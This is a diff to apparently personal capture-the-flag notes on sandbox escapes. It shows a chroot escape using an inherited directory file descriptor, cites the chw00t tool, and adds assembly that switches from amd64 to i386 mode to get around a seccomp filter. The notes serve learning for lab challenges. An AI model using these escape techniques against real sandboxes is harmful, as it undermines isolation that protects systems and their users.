@@ -1,6 +1,6 @@
 pwnable notes
 
-# chroot
+# escape chroot
 https://github.com/earthquake/chw00t
 ```console
 - wrong setup (chroot without chdir)
@@ -18,4 +18,14 @@ https://github.com/earthquake/chw00t
 ```console
 - you can open a file and pass to the fd you want like this
 /challenge/babyjail_level8 0 < shellcode-raw 3</
+```
+
+# escape seccomp
+```console
+- exchange from amd64 into i386 to use difference number of SYS_No of syscalls
+    xor rsp, rsp
+    mov esp, 0x1337800
+    mov DWORD PTR [esp+4], 0x23
+    mov DWORD PTR [esp], 0x1337080
+    retf
 ```
